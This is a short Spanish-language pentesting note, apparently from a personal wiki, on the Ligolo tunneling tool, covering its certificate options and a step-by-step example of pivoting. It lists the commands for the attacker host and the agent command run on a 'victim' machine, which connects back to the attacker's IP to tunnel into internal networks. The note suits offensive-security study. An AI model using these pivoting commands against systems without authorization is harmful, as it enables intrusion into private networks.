Herramienta programada en go usada para crear túneles a través de [[TCP]]/[[TLS]] para crear un túnel o pivote hacia otra conexión.

Ligolo tiene la capacidad de usar certificados para encriptar la comunicación, tiene integrada la capacidad de usar servidores de letsencrypt para que el lograr esto sea lo mas sencillo posible, obviamente, esta función depende de una conexión a internet activa.
## Conexión a Internet disponible
En el caso de tener conexión a internet, es posible dar el parámetro `-autocert` para que ligolo gestione por si mismo el uso de certificados
## Conexión a Internet no disponible
En el caso de no tener conexión a internet, es posible crear certificados propios y alimentar a ligolo con estos o que ligolo genere sus propios certificados con `-selfcert`, esto ultimo no es recomendado por lo susceptible que es a ataques [[MITM]]
# Ejemplo de uso
Se instala el agente de ligolo en una maquina comprometida y en la maquina host se usa
`sudo ip tuntap add user username mode tun ligolo`
`sudo ip link set ligolo up`
`(ruta ligolo)/proxy -autocert`
Una vez hecho lo anterior, se ejecutan los siguientes comandos en la maquina victima:
`./agent -connect (ip):11601`
En el caso de que se este usando `-selfcert` en la maquina host, se debe agregar `-ignore-cert`
Con esto, se inicia el agente y se conecta al servidor ligolo en la maquina host, a la que se debe ir y usar:
`session`
Esto es usado para listar las sesiones activas de ligolo, y se debe seleccionar la deseada, en otra terminal de la maquina host, se debe usar:
`sudo ip route add (ip red a la que se desea pivotar)/(mascara) dev ligolo`
Luego de esto, se debe volver a la sesión de ligolo y usar el comando
`start`
Con esto ya queda establecido el túnel a las redes a las que la maquina victima tenga acceso